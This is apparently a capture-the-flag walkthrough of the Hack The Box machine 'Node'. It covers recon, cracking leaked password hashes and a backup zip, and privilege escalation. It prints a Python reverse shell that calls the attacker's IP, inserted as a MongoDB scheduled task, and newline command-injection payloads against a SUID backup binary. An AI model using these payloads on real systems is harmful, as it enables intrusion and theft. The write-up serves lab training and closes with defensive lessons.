# Node Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*vOzQoHKlOvJN3khc5oj8pw.png)

## Reconnaissance <a id="8919"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.58
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 22:** running OpenSSH 7.2p2
* **Port 3000:** running Apache Hadoop

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 22:46 EST
Nmap scan report for 10.10.10.58
Host is up (0.032s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.58
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.58
```

We get back the following result showing that no other ports are open.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 06:35 EST
Nmap scan report for 10.10.10.58
Host is up (0.032s latency).
All 65535 scanned ports on 10.10.10.58 are open|filteredNmap done: 1 IP address (1 host up) scanned in 2355.48 seconds
```

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 3000 is running a web server, so we’ll perform our standard enumeration techniques on it.

## Enumeration <a id="6ff4"></a>

I always start off with enumerating HTTP first.

**Port 3000**

Visit the application in the browser.

![](https://miro.medium.com/max/1334/1*_rVrmRbB-ZDk6su3LEBUOw.png)

View page source to to see if there are any left over comments, extra information, version number, etc.

```text
<script type="text/javascript" src="assets/js/app/app.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
```

We find links to a bunch of custom scripts. The app.js & login.js scripts don’t give us anything useful. On the other hand, if you view the /home.js, you get the following code.

```text
var controllers = angular.module('controllers');controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

There’s a link to a list of users. Let’s see if that link is restricted.

![](https://miro.medium.com/max/948/1*sg-bYAkPxVLi40O-UG3F2Q.png)

We get back the above results giving us what seems to be usernames and hashed passwords. As stated with the “is-admin” flag, none of them have admin functionality.

Similarly, the /admin.js script contains the following code.

```text
var controllers = angular.module('controllers');controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }$http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

When you visit the /api/admin/backup link, you get an “authenticated: false” error. This link is restricted but at least we know that the admin account has a backup file in it.

The /profile.js script contains the following code.

```text
var controllers = angular.module('controllers');controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```

When you visit the /api/users/ link, we get a full list of hashed user credentials, including the admin account!

![](https://miro.medium.com/max/951/1*zmprdKZy8QmVcXLODpwZtA.png)

Copy the credentials and save them in a file.

```text
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

Use a password cracking tool in order to crack as many passwords as possible. For this blog, I used an [online tool](https://crackstation.net/) since it’s faster than my local machine.

We get back the following result showing that it cracked 3/4 passwords.

![](https://miro.medium.com/max/854/1*8C3dVN7nnUtePV2-4yjUGw.png)

One thing to note here is none of the passwords are salted. This can be verified using the following command.

```text
echo -n "manchester" | sha256sum
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af  -
```

This obviously considerably decreased the amount of time it would have taken the tool to crack all the passwords.

Let’s login with the admin’s account myP14ceAdm1nAcc0uNT/manchester.

![](https://miro.medium.com/max/1289/1*caAzMzFlNGAQgpSYvkiZvA.png)

Click on the _Download Backup_ button to download the file. Run the following command to determine the file type.

```text
root@kali:~/Desktop/htb/node# file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```

It contains ASCII text. Let’s view the first few characters of the file.

```text
root@kali:~/Desktop/htb/node# head -c100 myplace.backup 
UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWYAyC151eAsAAQQAAAAABAAAAABQ
```

This looks like base64 encoding. Let’s try and decode the file.

```text
cat myplace.backup | base64 --decode > myplace-decoded.backup
```

Now view the file type.

```text
root@kali:~/Desktop/htb/node# file myplace-decoded.backup 
myplace-decoded.backup: Zip archive data, at least v1.0 to extract
```

It’s a zip file! Let’s try and decompress it.

```text
root@kali:~/Desktop/htb/node# unzip myplace-decoded.backup
Archive:  myplace-decoded.backup
[myplace-decoded.backup] var/www/myplace/package-lock.json password:
```

It requires a password. Run a password cracker on the file.

```text
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
```

* **-u:** try to decompress the first file by calling unzip with the guessed password
* **-D:** select dictionary mode
* **-p:** password file

It cracks the password!

```text
PASSWORD FOUND!!!!: pw == magicword
```

Unzip the file using the above password.

```text
unzip -P magicword myplace-decoded.backup
```

Now it’s a matter of going through the files to see if there are hard coded credentials, exploitable vulnerabilities, use of vulnerable dependencies, etc.

While reviewing the files, you’ll see hard coded mongodb credentials in the app.js file.

```text
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

We found a username ‘mark’ and a password ‘5AYRft73VtFpc84k’ to connect to mongodb locally. We also see a backup\_key which we’re not sure where it’s used, but we’ll make note of it.

## Initial Foothold <a id="c543"></a>

Most user’s reuse passwords, so let’s use the password we found to SSH into mark’s account.

```text
ssh mark@10.10.10.58
```

It worked! Let’s locate the user.txt flag and view it’s contents.

```text
mark@node:~$ locate user.txt
/home/tom/user.txt
mark@node:~$ cat /home/tom/user.txt 
cat: /home/tom/user.txt: Permission denied
```

We need to either escalate our privileges to tom or root in order to view the flag.

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

Below are the important snippets of the script output that will allow us to escalate privileges to tom.

```text
### NETWORKING  ##########################################
.....
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
.....### SERVICES #############################################
[-] Running processes:USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
.....
tom       1196  0.0  7.3 1028640 56072 ?       Ssl  03:44   0:06 /usr/bin/node /var/www/myplace/app.js
mongodb   1198  0.5 11.6 281956 87956 ?        Ssl  03:44   2:43 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1199  0.0  5.9 1074616 45264 ?       Ssl  03:44   0:07 /usr/bin/node /var/scheduler/app.js
....
```

The **networking** section tells us that mongodb is listening locally on port 27017. We can connect to it because we found hardcoded credentials in the app.js file. The **services** section tells us that there is a process compiling the app.js file that is being run by Tom. Since we are trying to escalate our privileges to Toms’, let’s investigate this file.

```text
mark@node:/tmp$ ls -la /var/scheduler/
total 28
drwxr-xr-x  3 root root 4096 Sep  3  2017 .
drwxr-xr-x 15 root root 4096 Sep  3  2017 ..
-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
drwxr-xr-x 19 root root 4096 Sep  3  2017 node_modules
-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
```

We only have permissions to read the file, so we can’t simply include a reverse shell in there. Let’s view the file, maybe we can exploit it in another way.

```text
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);});
```

If you’re like me and you’re not too familiar with the mongodb structure, then [this ](https://www.includehelp.com/mongodb/a-deep-dive-into-mongo-database.aspx)[diagram](https://www.includehelp.com/mongodb/a-deep-dive-into-mongo-database.aspx) might help.

![](https://miro.medium.com/max/463/1*m1Xbnhc76OWw5MgSrAfvjQ.png)

We login using mark’s credentials and access the scheduler database. The set interval function seems to be checking for documents \(equivalent to rows\) in the tasks collection \(equivalent to tables\). For each document it executes the cmd field. Since we do have access to the database, we can add a document that contains a reverse shell as the cmd value to escalate privileges.

Let’s connect to the database.

```text
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
```

* **-u:** username
* **-p:** password
* **host:port/db:** connection string

Let’s run a few commands to learn more about the database.

```text
# Lists the database name
> db
scheduler# Shows all the tables in the database - equivalent to 'show tables'
> show collections
tasks# List content in tasks table - equivalent to 'select * from tasks'
> db.tasks.find()
```

The tasks collection does not contain any documents. Let’s add one that sends a[ reverse shell ](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)back to our attack machine.

```text
# insert document that contains a reverse shell
db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})# double check that the document got added properly.
db.tasks.find()
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Wait for the scheduled task to run.

![](https://miro.medium.com/max/976/1*pn6ccKnFendlQLV4amy6rw.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user.txt flag.

![](https://miro.medium.com/max/614/1*c2OPDps8LPRrtQz22yUGFg.png)

To grab the root.txt flag, we need to escalate our privileges to root.

## Privilege Escalation <a id="d22d"></a>

First, print the real and effective user and group IDs of the user.

```text
tom@node:/tmp$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Second, review the LinEnum script for any info/files that are either associated to Tom’s id or groups that he is in.

After sifting through all the output from the script, we notice the following file which has the SUID bit set.

```text
[-] SUID files:
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Since the SUID bit is set for this file, it will execute with the level of privilege that matches the user who owns the file. In this case, the file is owned by root, so the file will execute with root privileges. From the previous command that we ran, we know that Tom is in the group 1002 \(admin\) and therefore can read and execute this file.

We did see this file getting called in the app.js script.

```text
....
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
....app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```

The file takes in three arguments:

* The string ‘-q’
* A backup key which is passed at the beginning of the script
* A directory path

Let’s try running the file with the above arguments.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
```

We get a base64 decoded string. Based on the output of the program, I’m going to go out on a limb and say that it’s backing up the directory path that is passed as an argument.

To verify that, run the command again and save it in file test, then base64 decode that file.

```text
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > testtom@node:/tmp$ cat test | base64 --decode > test-decodedtom@node:/tmp$ file test-decoded 
test-decoded: Zip archive data, at least v1.0 to extracttom@node:/tmp$ unzip test-decoded
Archive:  test-decoded
   creating: tmp/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/tmp/
[test-decoded] tmp/test password: 
 extracting: tmp/test                
   creating: tmp/.Test-unix/
  inflating: tmp/LinEnum.sh          
   creating: tmp/.XIM-unix/
   creating: tmp/vmware-root/
   creating: tmp/.X11-unix/
   creating: tmp/.ICE-unix/
   creating: tmp/.font-unix/
  inflating: tmp/pspy64
```

When decompressing the file, we use the same password we cracked earlier.

Alright, let’s pass the root.txt file path as an argument to the backup program.

```text
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > roottom@node:/tmp$ cat root | base64 --decode > root-decodedroot@kali:~/Desktop/htb/node# file root-decoded
root-decoded: Zip archive data, at least v?[0x333] to extractroot@kali:~/Desktop/htb/node# 7z x root-decoded
```

**Note:** When I used unzip on the root zip file, I kept getting a “need PK compat. v5.1 \(can do v4.6\)” message. So I had to transfer the file to my attack machine and use 7z instead.

Let’s output the root.txt file.

![](https://miro.medium.com/max/620/1*M0Y4-VaSgll3oIURyDKcRg.png)

We get the troll face.

Something in the backup file is intentionally preventing us from getting the root flag. Let’s run the ltrace program to see what system commands are getting called when we run the backup program.

```text
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /../../etc > test
```

We get back the following result.

```text
strstr("/tmp", "..")                             = nil
strstr("/tmp", "/root")                          = nil
strchr("/tmp", ';')                              = nil
strchr("/tmp", '&')                              = nil
strchr("/tmp", '`')                              = nil
strchr("/tmp", '$')                              = nil
strchr("/tmp", '|')                              = nil
strstr("/tmp", "//")                             = nil
strcmp("/tmp", "/")                              = 1
strstr("/tmp", "/etc")                           = nil
strcpy(0xff98a1ab, "/tmp")                       = 0xff98a1ab
```

Let’s look up what the functions do.

* **strstr:** returns pointer to first occurrence of str2 in str1
* **strchr:** returns pointer to first occurrence of char in str1
* **strcmp: r**eturns 0 if str1 is same as str2

As can be seen, the program is filtering the directory path string. If we include any of the strings enclosed in the strchr or strstr function as a directory path, we end up with a troll face. Similarly, if the directory path is a single “/”, we also get a troll face. So we’re allowed to use a backslash as long as it’s included as a string with other characters.

**Note:** There are several methods we can use apply on the backup program in order to escalate privileges. I initially solved it using method 1 & method 2, however, after I watched [ippsec](https://www.youtube.com/watch?v=sW10TlZF62w)’s video, I found out there were other ways to escalate privileges \(methods 3, 4 & 5\).

**Method 1 — Using Wildcards**

The \* character is not filtered in the program, therefore we can use it to make a backup of the root directory.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
```

Then use the same method to base64 decode and compress the file to view the flag.

![](https://miro.medium.com/max/629/1*F02qM-0wEgiCCrk8oS5Myw.png)

**Method 2 — Using the Home Variable**

The ~ character is not filtered either, so we can make use of it to make a backup of the root directory.

First, set the $HOME environment variable to be /root.

```text
export HOME=/root
```

Then, call the backup program with the ~ character.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~"
```

**Method 3— Using Symlinks**

A symbolic link is a file that points to another file. Let’s point the root.txt file to a file called alt-file.txt.

```text
tom@node:/tmp$ mkdir altdir
tom@node:/tmp$ cd altdir/
tom@node:/tmp/altdir$ ln -s /root/root.txt altfile
```

* **-s:** make symbolic links instead of hard links

Then, call the backup program with the link file.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/altdir
```

**Method 4— Command Injection**

The past three methods involved us exploiting the backup file in a way that gives us access to a privileged file. We haven’t really escalated our privileges to root. This method exploits a command injection vulnerability that will give us a shell with root privileges.

Run ltrace again on the program to backup a file that doesn’t exist, in our case, we name that file “bla”

```text
ltrace -s 200 ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 bla
```

You get the following system call.

```text
...
system("/usr/bin/zip -r -P magicword /tmp/.backup_725656931 bla > /dev/null" <no return ...>
...
```

It runs the zip command on the file name. Since the input is only partially validated against the list of characters we found above, we can exploit this to get command execution.

One thing to note is that it does send the output to /dev/null and therefore to bypass that we have to pass a random command/string after our bash shell command.

The new line character \(\n\) is not blacklisted and so we can use it as part of our exploit. In order to execute multiple commands in the system command we usually use the “;” character but that is blacklisted, so we’ll resort to using the new line character “\n”

```text
# set a new line variable
newline=$'\n'# exploit
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "bla${newline}/bin/bash${newline}bla"
```

The way the exploit works is it first runs the zip command on the first “bla” we encounter, then it reaches the new line and runs the command /bin/bash giving us a shell and then sends the output of the second “bla” to /dev/null.

![](https://miro.medium.com/max/1025/1*RAZHi8w4kX6ug2SZDV0U-w.png)

This gives us root access to the machine!

Another way of doing it is using the printf command.

```text
newline=$'\n'
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'bla\n/bin/bash\nbla')"
```

**Method 5— Buffer Overflow**

I unfortunately still don’t know how to exploit buffer overflow vulnerabilities yet. When I do, I’ll update this blog explaining how to escalate privileges using a buffer overflow exploit. In the mean time, both [ippsec](https://www.youtube.com/watch?v=sW10TlZF62w) and [rastating](https://rastating.github.io/hackthebox-node-walkthrough/) have walkthroughs explaining it.

## Lessons Learned <a id="3130"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Broken access control. The /users API endpoint was exposed and that allowed us to get a list of credentials without having any access rights. Although access control is being done on other endpoints, the developers must have forgotten to restrict access to this endpoint. Proper access control should be applied on all sensitive API endpoints.
2. Weak login credentials and insecure hashing implementation. We were able to crack the passwords we found in the users file in a matter of seconds. That was due to two reasons: \(1\) the users had chosen easy passwords that were easily crackable, and \(2\) the passwords were not salted and therefore they can be easily looked up in a pre-computed table \(rainbow tables\) to see if the given password hash matches any of the hashes in the table. Therefore, to avoid this, the application developers should enforce strong password policies on users and use a salt when hashing users’ passwords.
3. Weak encryption credentials. The backup file we found was zipped and encrypted with a weak password. The administrators should have used a sufficiently long password that is not easily crackable.
4. Hard coded credentials and password reuse. After cracking the password on the zipped file we found an app.js file that contains hard coded credentials. Although the credentials were for mongodb, a service that was not publicly exposed, the user used the same credentials for his SSH account. This final vulnerability chained with the above listed vulnerabilities allowed us to gain initial access to the box. When possible, developers should not embed credentials in files and security awareness should be given to users on password management best practices.

To escalate privileges we exploited two vulnerability.

1. Security misconfiguration of app.js. The app.js file was being run as a scheduled task by the ‘tom’ user, although the file was executing code from mongodb using a less privileged user’s credentials \(mark\). This allowed us to escalate our privileges to ‘tom’. To avoid that, mark should have been the owner of the scheduled task.
2. Insufficient user input validation in backup binary. The user ‘tom’ was configured to be in the admin group and therefore had execute rights on the backup binary. However, this binary file had the suid bit set and was owned by root. Since command line arguments were not properly validated, we were able to exploit a command injection to get root level access on the system. This could have been avoided if user input was properly validated — whitelisting instead of blacklisting, use of safe functions, etc.

